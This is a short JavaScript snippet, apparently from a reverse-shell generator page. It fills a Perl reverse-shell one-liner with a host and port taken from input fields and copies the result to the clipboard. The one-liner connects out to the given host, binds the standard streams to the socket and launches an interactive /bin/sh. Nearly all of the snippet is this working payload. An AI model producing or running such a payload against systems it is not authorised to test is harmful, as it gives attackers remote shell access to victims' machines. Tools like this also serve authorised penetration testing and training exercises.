const templates = [(host, port) => `perl -e 'use Socket;$i="${host}";$p=${port};socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));connect(S,sockaddr_in($p,inet_aton($i)));open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");'`];
const command = templates[0](hostInput.value, portInput.value);
const code = document.createElement("code");
code.textContent = command;
button.addEventListener("click", () => navigator.clipboard.writeText(command));
